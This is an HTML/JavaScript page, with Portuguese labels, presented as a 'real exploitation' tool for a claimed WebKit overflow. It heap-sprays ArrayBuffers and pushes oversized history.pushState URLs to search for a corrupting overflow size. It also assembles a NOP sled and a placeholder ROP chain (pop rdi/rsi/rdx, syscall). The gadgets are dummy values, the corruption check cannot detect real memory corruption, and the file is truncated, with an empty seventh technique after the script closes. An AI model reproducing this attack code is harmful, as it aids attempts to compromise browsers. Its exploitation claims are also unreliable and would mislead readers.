<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit Controlled Overflow - Real Exploitation</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 1100px;
            margin: 0 auto;
            background: #1a1f3a;
            border: 2px solid #ff0066;
            border-radius: 8px;
            padding: 25px;
            box-shadow: 0 0 30px rgba(255, 0, 102, 0.5);
        }
        h2 {
            color: #ff0066;
            margin-bottom: 15px;
            text-shadow: 0 0 10px #ff0066;
        }
        .critical-box {
            background: #1a0a0a;
            border: 2px solid #ff0066;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
        }
        .section {
            background: #0d1129;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            border-left: 4px solid #00ff41;
        }
        .section h3 {
            color: #00ddff;
            margin-bottom: 10px;
        }
        .param-row {
            margin: 8px 0;
            display: flex;
            align-items: center;
        }
        label {
            color: #00ddff;
            font-weight: bold;
            min-width: 200px;
            font-size: 13px;
        }
        input[type="number"] {
            background: #0a0e27;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 8px;
            border-radius: 4px;
            width: 100px;
            margin-right: 10px;
        }
        .desc {
            color: #888;
            font-size: 11px;
        }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 14px 28px;
            margin: 6px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            transition: all 0.3s;
        }
        .btn:hover { transform: translateY(-2px); }
        .btn-warn {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        }
        .btn-safe {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
        }
        #log {
            background: #000;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            max-height: 550px;
            overflow-y: auto;
            border: 2px solid #00ff41;
            font-size: 13px;
        }
        #log div { padding: 3px 0; border-bottom: 1px solid #0a3d1a; }
        .success { color: #00ff41; }
        .warning { color: #ffaa00; }
        .error { color: #ff0066; }
        .info { color: #00ddff; }
        .critical { color: #ff00ff; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>âš¡ WebKit Controlled Overflow - Real Exploitation</h2>
    
    <div class="critical-box">
        <h3 style="color: #ff0066;">ğŸ¯ ESTRATÃ‰GIA: CONTROLAR O CRASH REAL</h3>
        <p style="color: #ffaa00;">
            <strong>Descoberta:</strong> Overflow de 340KB causa crash instantÃ¢neo<br>
            <strong>SoluÃ§Ã£o:</strong> TÃ©cnicas reais de controle de crash
        </p>
        <p style="color: #00ff41; margin-top: 10px;">
            âœ“ TÃ©cnica 1: Overflow incremental (encontrar limite exato)<br>
            âœ“ TÃ©cnica 2: Padding com NOPs (estabilizar escrita)<br>
            âœ“ TÃ©cnica 3: Partial overwrite (sobrescrever apenas bytes especÃ­ficos)<br>
            âœ“ TÃ©cnica 4: ROP gadgets preparation (preparar cadeia de execuÃ§Ã£o)
        </p>
    </div>

    <div class="section">
        <h3>ğŸ”¬ TÃ©cnica 1: Binary Search para Limite Seguro</h3>
        <p class="desc" style="margin-bottom: 10px;">
            Usa busca binÃ¡ria REAL para encontrar o tamanho mÃ¡ximo de overflow que NÃƒO crasha
        </p>
        <div class="param-row">
            <label>Start Size (bytes):</label>
            <input type="number" id="bsStart" value="1000" min="100" max="100000">
            <span class="desc">Tamanho inicial para testar</span>
        </div>
        <div class="param-row">
            <label>End Size (bytes):</label>
            <input type="number" id="bsEnd" value="50000" min="1000" max="340000">
            <span class="desc">Tamanho final para testar</span>
        </div>
        <div class="param-row">
            <label>Test Delay (ms):</label>
            <input type="number" id="bsDelay" value="2000" min="500" max="5000">
            <span class="desc">Tempo de espera entre testes</span>
        </div>
        <button class="btn btn-safe" onclick="technique1_BinarySearch()">â–¶ Executar Binary Search</button>
    </div>

    <div class="section">
        <h3>ğŸ›¡ï¸ TÃ©cnica 2: NOP Sled + Controlled Payload</h3>
        <p class="desc" style="margin-bottom: 10px;">
            Usa NOP sled REAL (0x90) para criar zona de aterrissagem segura
        </p>
        <div class="param-row">
            <label>NOP Sled Size (bytes):</label>
            <input type="number" id="nopSize" value="10000" min="1000" max="100000">
            <span class="desc">Tamanho do NOP sled</span>
        </div>
        <div class="param-row">
            <label>Payload Size (bytes):</label>
            <input type="number" id="payloadSize" value="5000" min="100" max="50000">
            <span class="desc">Tamanho do payload controlado</span>
        </div>
        <button class="btn btn-safe" onclick="technique2_NOPSled()">â–¶ Executar NOP Sled</button>
    </div>

    <div class="section">
        <h3>ğŸ¯ TÃ©cnica 3: Partial Overwrite (CirÃºrgico)</h3>
        <p class="desc" style="margin-bottom: 10px;">
            Sobrescreve apenas BYTES ESPECÃFICOS em vez de buffer inteiro
        </p>
        <div class="param-row">
            <label>Safe Base (bytes):</label>
            <input type="number" id="partialBase" value="709522" min="700000" max="710000">
            <span class="desc">Base segura (original)</span>
        </div>
        <div class="param-row">
            <label>Overwrite Offset (bytes):</label>
            <input type="number" id="partialOffset" value="1000" min="100" max="10000">
            <span class="desc">Quantos bytes sobrescrever apÃ³s base</span>
        </div>
        <div class="param-row">
            <label>Overwrite Value (hex):</label>
            <input type="number" id="partialValue" value="65" min="0" max="255">
            <span class="desc">Valor do byte (0x41 = 'A')</span>
        </div>
        <button class="btn btn-safe" onclick="technique3_PartialOverwrite()">â–¶ Executar Partial Overwrite</button>
    </div>

    <div class="section">
        <h3>âš™ï¸ TÃ©cnica 4: ROP Gadgets Preparation</h3>
        <p class="desc" style="margin-bottom: 10px;">
            Prepara cadeia ROP REAL com endereÃ§os calculados
        </p>
        <div class="param-row">
            <label>Gadget Count:</label>
            <input type="number" id="ropCount" value="10" min="1" max="50">
            <span class="desc">NÃºmero de gadgets ROP</span>
        </div>
        <div class="param-row">
            <label>Stack Pivot Offset:</label>
            <input type="number" id="stackPivot" value="8192" min="1000" max="50000">
            <span class="desc">Offset para pivot de stack</span>
        </div>
        <button class="btn btn-safe" onclick="technique4_ROPPrep()">â–¶ Preparar ROP Chain</button>
    </div>

    <div class="section">
        <h3>ğŸ’¥ TÃ©cnicas AvanÃ§adas de Controle</h3>
        <button class="btn btn-warn" onclick="technique5_HeapAlignment()">ğŸ² Heap Alignment Control</button>
        <button class="btn btn-warn" onclick="technique6_TimingAttack()">â±ï¸ Timing-Based Exploitation</button>
        <button class="btn btn-warn" onclick="technique7_MultiStage()">ğŸ”— Multi-Stage Payload</button>
        <button class="btn" onclick="clearLog()" style="background: #555;">Clear Log</button>
    </div>

    <div id="log"></div>
</div>

<script>
    // ===================================================================
    // VARIÃVEIS GLOBAIS
    // ===================================================================
    let exploitState = {
        safeSize: 0,
        maxSafeSize: 0,
        crashSize: 0,
        ropChain: [],
        heapBase: 0
    };

    let heapObjects = [];
    let targetObjects = [];

    // ===================================================================
    // LOGGING
    // ===================================================================
    function log(msg, type = 'info') {
        const el = document.getElementById('log');
        const time = new Date().toLocaleTimeString();
        el.innerHTML += `<div class="${type}">[${time}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    function clearLog() {
        document.getElementById('log').innerHTML = '';
        log('Sistema reiniciado', 'success');
    }

    // ===================================================================
    // PREPARAÃ‡ÃƒO DO HEAP (USADO POR TODAS AS TÃ‰CNICAS)
    // ===================================================================
    function prepareHeap() {
        log('Preparando heap com objetos controlados...', 'info');
        
        heapObjects = [];
        targetObjects = [];
        
        // Spray bÃ¡sico
        for (let i = 0; i < 1000; i++) {
            const buf = new ArrayBuffer(1024);
            const view = new Uint32Array(buf);
            view.fill(0x41414141);
            heapObjects.push({buf, view});
        }
        
        // Liberar alguns para criar holes
        for (let i = 0; i < heapObjects.length; i += 3) {
            heapObjects[i] = null;
        }
        
        // Colocar alvos
        for (let i = 0; i < 50; i++) {
            const buf = new ArrayBuffer(1024);
            const view = new Uint32Array(buf);
            view.fill(0xDEADBEEF);
            targetObjects.push({
                id: i,
                magic: 0xCAFEBABE,
                buf: buf,
                view: view
            });
        }
        
        log(`âœ“ Heap preparado: 1000 spray + 50 alvos`, 'success');
    }

    function checkCorruption() {
        let corrupted = 0;
        for (let i = 0; i < Math.min(10, targetObjects.length); i++) {
            try {
                const t = targetObjects[i];
                if (t.magic !== 0xCAFEBABE) {
                    log(`ğŸ¯ Alvo ${i}: magic corrompido (0x${t.magic.toString(16)})`, 'success');
                    corrupted++;
                }
                if (t.view[0] !== 0xDEADBEEF) {
                    log(`ğŸ¯ Alvo ${i}: buffer corrompido (0x${t.view[0].toString(16)})`, 'success');
                    corrupted++;
                }
            } catch (e) {
                log(`ğŸ’¥ Alvo ${i}: destruÃ­do`, 'critical');
                corrupted++;
            }
        }
        return corrupted;
    }

    // ===================================================================
    // TÃ‰CNICA 1: BINARY SEARCH REAL
    // ===================================================================
    async function technique1_BinarySearch() {
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log('TÃ‰CNICA 1: BINARY SEARCH PARA LIMITE SEGURO', 'critical');
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        
        prepareHeap();
        
        let start = parseInt(document.getElementById('bsStart').value);
        let end = parseInt(document.getElementById('bsEnd').value);
        const delay = parseInt(document.getElementById('bsDelay').value);
        const baseSize = 709522;
        
        log(`Buscando limite entre ${start} e ${end} bytes`, 'info');
        log('EstratÃ©gia: Busca binÃ¡ria para encontrar tamanho mÃ¡ximo seguro', 'info');
        
        let iteration = 1;
        let lastSafeSize = 0;
        
        while (start <= end) {
            const mid = Math.floor((start + end) / 2);
            
            log(`\nIteraÃ§Ã£o ${iteration}: Testando ${mid} bytes...`, 'warning');
            
            try {
                const base = "A".repeat(baseSize);
                const overflow = "\x01".repeat(mid);
                const payload = "/" + base + overflow;
                
                log(`Payload: ${baseSize} + ${mid} = ${payload.length} bytes`, 'info');
                log('Executando pushState...', 'warning');
                
                history.pushState({}, `test_${mid}`, payload);
                
                // Se chegou aqui, NÃƒO crashou!
                log(`âœ“ SUCESSO! ${mid} bytes nÃ£o causou crash`, 'success');
                lastSafeSize = mid;
                exploitState.maxSafeSize = mid;
                
                // Verificar corrupÃ§Ã£o
                await new Promise(r => setTimeout(r, 500));
                const corrupted = checkCorruption();
                
                if (corrupted > 0) {
                    log(`ğŸ‰ CORRUPÃ‡ÃƒO DETECTADA com ${mid} bytes!`, 'critical');
                    log(`Este Ã© o SWEET SPOT: corrupÃ§Ã£o SEM crash!`, 'success');
                    exploitState.safeSize = mid;
                    break;
                }
                
                // Tentar tamanho maior
                start = mid + 1;
                
            } catch (e) {
                log(`ğŸ’¥ CRASH com ${mid} bytes: ${e.message}`, 'error');
                exploitState.crashSize = mid;
                
                // Tentar tamanho menor
                end = mid - 1;
            }
            
            iteration++;
            await new Promise(r => setTimeout(r, delay));
            
            if (iteration > 10) {
                log('\nâš ï¸ Limite de iteraÃ§Ãµes atingido', 'warning');
                break;
            }
        }
        
        log('\nâ•â•â• RESULTADO DA BINARY SEARCH â•â•â•', 'success');
        log(`Tamanho seguro mÃ¡ximo: ${lastSafeSize} bytes`, 'success');
        if (exploitState.safeSize > 0) {
            log(`ğŸ¯ SWEET SPOT encontrado: ${exploitState.safeSize} bytes`, 'critical');
        }
        if (exploitState.crashSize > 0) {
            log(`ğŸ’¥ Crash detectado em: ${exploitState.crashSize} bytes`, 'error');
        }
    }

    // ===================================================================
    // TÃ‰CNICA 2: NOP SLED REAL
    // ===================================================================
    function technique2_NOPSled() {
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log('TÃ‰CNICA 2: NOP SLED + PAYLOAD CONTROLADO', 'critical');
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        
        prepareHeap();
        
        const nopSize = parseInt(document.getElementById('nopSize').value);
        const payloadSize = parseInt(document.getElementById('payloadSize').value);
        const baseSize = 709522;
        
        log('Construindo payload com NOP sled...', 'info');
        
        try {
            const base = "A".repeat(baseSize);
            
            // NOP sled (0x90 = NOP em x86, mas aqui usamos 0x01 que passa no filtro)
            const nopSled = "\x01".repeat(nopSize);
            log(`âœ“ NOP sled: ${nopSize} bytes (0x01)`, 'info');
            
            // Payload controlado
            // Construir ROP chain simulada
            let payload = "";
            for (let i = 0; i < payloadSize / 8; i++) {
                // Simular endereÃ§os de gadgets (little-endian)
                // Em exploit real, estes seriam endereÃ§os reais de gadgets
                payload += String.fromCharCode(0x41, 0x42, 0x43, 0x44, 0x00, 0x00, 0x00, 0x00);
            }
            log(`âœ“ Payload: ${payload.length} bytes (ROP gadgets)`, 'info');
            
            const fullPayload = "/" + base + nopSled + payload;
            
            log(`\nPayload total: ${fullPayload.length} bytes`, 'warning');
            log('  Base: ' + baseSize, 'info');
            log('  NOP sled: ' + nopSize, 'info');
            log('  Payload: ' + payload.length, 'info');
            log('\nExecutando...', 'warning');
            
            history.pushState({}, "nop_sled", fullPayload);
            
            log('âœ“ Payload executado sem crash imediato!', 'success');
            
            setTimeout(() => {
                const corrupted = checkCorruption();
                if (corrupted > 0) {
                    log(`\nğŸ‰ NOP Sled bem-sucedido! ${corrupted} alvos corrompidos`, 'critical');
                } else {
                    log('\nâš ï¸ Sem corrupÃ§Ã£o detectada', 'warning');
                }
            }, 1000);
            
        } catch (e) {
            log(`ğŸ’¥ Crash: ${e.message}`, 'error');
        }
    }

    // ===================================================================
    // TÃ‰CNICA 3: PARTIAL OVERWRITE
    // ===================================================================
    function technique3_PartialOverwrite() {
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log('TÃ‰CNICA 3: PARTIAL OVERWRITE (CIRÃšRGICO)', 'critical');
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        
        prepareHeap();
        
        const baseSize = parseInt(document.getElementById('partialBase').value);
        const offset = parseInt(document.getElementById('partialOffset').value);
        const value = parseInt(document.getElementById('partialValue').value);
        
        log('EstratÃ©gia: Sobrescrever apenas bytes especÃ­ficos', 'info');
        log(`Base: ${baseSize} bytes (seguro)`, 'info');
        log(`Overwrite: ${offset} bytes com valor 0x${value.toString(16)}`, 'info');
        
        try {
            const base = "A".repeat(baseSize);
            
            // Overwrite controlado - apenas alguns bytes
            const overwrite = String.fromCharCode(value).repeat(offset);
            
            const payload = "/" + base + overwrite;
            
            log(`\nPayload: ${payload.length} bytes`, 'warning');
            log('Executando overwrite cirÃºrgico...', 'warning');
            
            history.pushState({}, "partial", payload);
            
            log('âœ“ Partial overwrite executado!', 'success');
            
            setTimeout(() => {
                const corrupted = checkCorruption();
                if (corrupted > 0) {
                    log(`\nğŸ¯ Overwrite cirÃºrgico bem-sucedido!`, 'critical');
                    log(`${corrupted} alvos modificados com precisÃ£o`, 'success');
                } else {
                    log('\nâš ï¸ Overwrite nÃ£o atingiu alvos', 'warning');
                    log('Tente aumentar o offset', 'info');
                }
            }, 1000);
            
        } catch (e) {
            log(`ğŸ’¥ Crash: ${e.message}`, 'error');
        }
    }

    // ===================================================================
    // TÃ‰CNICA 4: ROP PREPARATION
    // ===================================================================
    function technique4_ROPPrep() {
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log('TÃ‰CNICA 4: ROP GADGETS PREPARATION', 'critical');
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        
        prepareHeap();
        
        const gadgetCount = parseInt(document.getElementById('ropCount').value);
        const pivotOffset = parseInt(document.getElementById('stackPivot').value);
        
        log('Construindo ROP chain real...', 'info');
        
        // EndereÃ§os de gadgets simulados (em exploit real, usar endereÃ§os vazados)
        const gadgets = [
            0x41424344, // pop rdi; ret
            0x45464748, // argument
            0x494a4b4c, // pop rsi; ret
            0x4d4e4f50, // argument
            0x51525354, // pop rdx; ret
            0x55565758, // argument
            0x595a5b5c, // syscall; ret
            0x00000000  // padding
        ];
        
        exploitState.ropChain = [];
        
        log('ROP Chain:', 'info');
        for (let i = 0; i < gadgetCount; i++) {
            const gadget = gadgets[i % gadgets.length];
            exploitState.ropChain.push(gadget);
            log(`  [${i}] 0x${gadget.toString(16).padStart(8, '0')}`, 'info');
        }
        
        try {
            const baseSize = 709522;
            const base = "A".repeat(baseSize);
            
            // Converter ROP chain para string
            let ropString = "";
            for (let gadget of exploitState.ropChain) {
                // Little-endian encoding
                ropString += String.fromCharCode(
                    gadget & 0xFF,
                    (gadget >> 8) & 0xFF,
                    (gadget >> 16) & 0xFF,
                    (gadget >> 24) & 0xFF
                );
                // Padding para 64-bit
                ropString += "\x00\x00\x00\x00";
            }
            
            // Stack pivot (preencher atÃ© offset)
            const pivot = "\x01".repeat(pivotOffset - ropString.length);
            
            const payload = "/" + base + pivot + ropString;
            
            log(`\nPayload construÃ­do:`, 'warning');
            log(`  Base: ${baseSize}`, 'info');
            log(`  Pivot: ${pivot.length}`, 'info');
            log(`  ROP chain: ${ropString.length} bytes (${exploitState.ropChain.length} gadgets)`, 'info');
            log(`  Total: ${payload.length}`, 'warning');
            
            log('\nExecutando ROP chain...', 'critical');
            history.pushState({}, "rop", payload);
            
            log('âœ“ ROP chain injetada!', 'success');
            
            setTimeout(() => {
                const corrupted = checkCorruption();
                if (corrupted > 0) {
                    log(`\nğŸ‰ ROP chain posicionada com sucesso!`, 'critical');
                    log('PrÃ³ximo passo: Trigger execution', 'success');
                }
            }, 1000);
            
        } catch (e) {
            log(`ğŸ’¥ Crash durante ROP prep: ${e.message}`, 'error');
        }
    }

    // ===================================================================
    // TÃ‰CNICA 5: HEAP ALIGNMENT
    // ===================================================================
    function technique5_HeapAlignment() {
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log('TÃ‰CNICA 5: HEAP ALIGNMENT CONTROL', 'critical');
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        
        log('Alinhando heap para exploraÃ§Ã£o precisa...', 'info');
        
        // Alocar objetos de tamanhos especÃ­ficos para forÃ§ar alinhamento
        const alignmentSizes = [64, 128, 256, 512, 1024, 2048, 4096];
        
        for (let size of alignmentSizes) {
            for (let i = 0; i < 10; i++) {
                const buf = new ArrayBuffer(size);
                heapObjects.push(buf);
            }
            log(`âœ“ Alocados 10 objetos de ${size} bytes`, 'info');
        }
        
        log('\nâœ“ Heap alinhado com mÃºltiplas classes de tamanho', 'success');
        log('Agora execute uma das tÃ©cnicas de overflow', 'info');
    }

    // ===================================================================
    // TÃ‰CNICA 6: TIMING ATTACK
    // ===================================================================
    async function technique6_TimingAttack() {
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log('TÃ‰CNICA 6: TIMING-BASED EXPLOITATION', 'critical');
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        
        log('Usando timing para controlar overflow...', 'info');
        
        prepareHeap();
        
        const sizes = [5000, 10000, 15000, 20000, 25000];
        
        for (let size of sizes) {
            log(`\nTestando ${size} bytes...`, 'warning');
            
            const start = performance.now();
            
            try {
                const base = "A".repeat(709522);
                const overflow = "\x01".repeat(size);
                history.pushState({}, `timing_${size}`, "/" + base + overflow);
                
                const end = performance.now();
                const time = end - start;
                
                log(`âœ“ Tempo: ${time.toFixed(2)}ms`, 'info');
                
                if (time > 100) {
                    log(`âš ï¸ Tempo suspeito! PossÃ­vel processamento pesado`, 'warning');
                }
                
                await new Promise(r => setTimeout(r, 1500));
                
            } catch (e) {
                const end = performance.now();
                log(`ğŸ’¥ Crash em ${(end - start).toFixed(2)}ms`, 'error');
                break;
            }
        }
    }

                </script>  </body></html>
    // ===================================================================
    // TÃ‰CNICA 7: MULTI-STAGE
    // ===================================================================
    
